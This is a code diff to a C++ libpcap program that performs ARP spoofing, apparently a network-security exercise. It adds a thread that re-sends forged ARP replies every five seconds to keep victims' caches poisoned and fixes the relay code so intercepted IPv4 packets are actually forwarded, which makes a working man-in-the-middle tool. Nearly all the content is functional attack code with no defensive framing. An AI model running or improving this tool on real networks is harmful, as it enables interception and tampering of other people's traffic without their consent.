@@ -7,7 +7,7 @@
 #include <unistd.h>
 #include <algorithm>
 #include <map>
-
+#include <thread>
 
 #pragma pack(push, 1)
 struct EthArpPacket final {
@@ -15,8 +15,10 @@ struct EthArpPacket final {
 	ArpHdr arp_;
 };
 #pragma pack(pop)
+
 struct IP_MAC{
-    Ip ip_;
+    Ip sip_;
+    Ip tip_;
     Mac mac_;
 };
 
@@ -118,14 +120,18 @@ int sendARP_reply(pcap_t *handle, Mac dmac, Mac smac, Ip sip, Ip tip){
 }
 
 int resolve_mac(Mac *result, pcap_t *handle, Mac smac, Ip sip, Ip tip){
-    sendARP_req(handle, smac, sip, tip);
+    int res = sendARP_req(handle, smac, sip, tip);
+    if(res != 0){
+        fprintf(stderr, "req error\n");
+        return -1;
+    }
     PEthHdr ethernet;
     PArpHdr arp;
     int count = 0;
-    while (count < 40) {
+    while (count < 10) {
         struct pcap_pkthdr *header;
         const u_char *packet;
-        int res = pcap_next_ex(handle, &header, &packet);
+        res = pcap_next_ex(handle, &header, &packet);
         if (res == 0) continue;
         if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
             printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
@@ -140,14 +146,20 @@ int resolve_mac(Mac *result, pcap_t *handle, Mac smac, Ip sip, Ip tip){
             return 0;
         }
         count++;
+        sendARP_req(handle, smac, sip, tip);
     }
-    fprintf(stderr, "couldn't find ARP reply in 40 sequence");
+    fprintf(stderr, "couldn't find ARP reply in 10 sequence");
     return -1;
 }
 
-int send_packet(pcap_t *handle);
-
-int relay_packet(pcap_t *handle);
+void ARPInfect(pcap_t *handle, Mac *sender_addr_Mac, Mac attackerMac, std::map<Mac, IP_MAC> senderMac_target_Map, unsigned int len){
+    while(1){
+        for(unsigned int i=0;i<len;i++){
+            sendARP_reply(handle, sender_addr_Mac[i], attackerMac, senderMac_target_Map[sender_addr_Mac[i]].tip_, senderMac_target_Map[sender_addr_Mac[i]].sip_);
+        }
+        sleep(5);
+    }
+}
 
 int main(int argc, char *argv[]) {
     if (argc < 4 || argc % 2 != 0) {
@@ -185,31 +197,27 @@ int main(int argc, char *argv[]) {
     std::map<Mac, IP_MAC> senderMac_target_Map;
 
     for(int i=0;i<argc-2;i++){
+        IP_MAC target;
         if (i%2 == 0){
             ret = resolve_mac(sender_addr_Mac+i/2, handle, attacker_mac, attacker_ip, Ip(argv[i+2]));
             if (ret != 0){
                 fprintf(stderr, "couldn't find Mac addr of %s\n", argv[i+2]);
                 return -1;
             }
+            target.sip_ = Ip(argv[i+2]);
         }
         else{
-            IP_MAC target;
             ret = resolve_mac(&(target.mac_), handle, attacker_mac, attacker_ip, Ip(argv[i+2]));
             if (ret != 0){
                 fprintf(stderr, "couldn't find Mac addr of %s\n", argv[i+2]);
                 return -1;
             }
-            target.ip_ = Ip(argv[i+2]);
+            target.tip_ = Ip(argv[i+2]);
             senderMac_target_Map.insert(std::pair<Mac, IP_MAC>(sender_addr_Mac[i/2], target));
         }
     }
 
-    for(int i=2,j=0;i<argc;i=i+2,j++){
-        ret = sendARP_reply(handle, sender_addr_Mac[j], attacker_mac, Ip(argv[i+1]), Ip(argv[i]));
-        if (ret != 0){
-            fprintf(stderr, "couldn't spoof %s to %s\n", argv[i], argv[i+1]);
-        }
-    }
+    std::thread t1(ARPInfect, handle, sender_addr_Mac, attacker_mac, senderMac_target_Map, (argc-2)/2);
 
     PEthHdr ethernet;
     PArpHdr arp;
@@ -230,14 +238,13 @@ int main(int argc, char *argv[]) {
         ethernet = (PEthHdr)packet;
         p = std::find(sender_addr_Mac, sender_addr_Mac+(argc-2)/2, ethernet->smac());
         if(p == sender_addr_Mac+(argc-2)/2) continue;
-
         if(ethernet->type() == EthHdr::Ip4){
             tmpPacket = new u_char[header->caplen];
             memcpy(tmpPacket, packet, header->caplen);
             ethernet = (PEthHdr)tmpPacket;
             ethernet->dmac_ = senderMac_target_Map[ethernet->smac()].mac_;
             ethernet->smac_ = attacker_mac;
-            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&tmpPacket), header->caplen);
+            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(tmpPacket), header->caplen);
             if (res != 0) {
                 fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
             }
@@ -246,7 +253,7 @@ int main(int argc, char *argv[]) {
         } else if (ethernet->type() == EthHdr::Arp){
             arp = (PArpHdr)(packet + sizeof(*ethernet));
             if (arp->op() != ArpHdr::Request) continue;
-            sendARP_reply(handle, *p, attacker_mac, senderMac_target_Map[arp->smac()].ip_, arp->sip());
+            sendARP_reply(handle, *p, attacker_mac, senderMac_target_Map[arp->smac()].tip_, arp->sip());
         }
     }
 
